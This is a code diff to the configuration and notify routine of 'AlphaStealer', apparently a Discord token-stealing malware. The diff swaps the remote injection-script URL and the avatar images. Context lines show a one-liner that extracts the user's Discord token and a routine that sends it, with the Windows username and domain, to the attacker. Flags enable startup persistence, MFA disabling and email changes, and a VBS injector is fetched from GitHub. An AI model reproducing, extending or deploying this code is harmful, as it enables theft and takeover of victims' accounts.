@@ -37,7 +37,7 @@ const CONFIG = {
     auto_persist_startup: 'True',
     auto_mfa_disabler: 'True',
     auto_email_update: 'True',
-    injection_url: 'https://raw.githubusercontent.com/alphastealer/discord-injection/refs/heads/main/index.js',
+    injection_url: 'https://raw.githubusercontent.com/Unk693/discord-injection/refs/heads/main/index.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
@@ -251,7 +251,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
     ctx.username = `AlphaStealer - Injection`;
-    ctx.avatar_url = `https://imgur.com/zMZNj3D.jpeg`;
+    ctx.avatar_url = `https://imgur.com/0sGc00W.png`;
 
     ctx.embeds[0].fields.unshift({
         name: `<:68602gg:1349774096690315294> Token:`,
@@ -299,7 +299,7 @@ const notify = async (ctx, token, user) => {
 
         embed.footer = {
             text: 'Developed By AlphaStealer',
-            icon_url: "https://imgur.com/zMZNj3D.jpeg",
+            icon_url: "https://imgur.com/0sGc00W.png",
         };
 
         embed.timestamp = new Date();
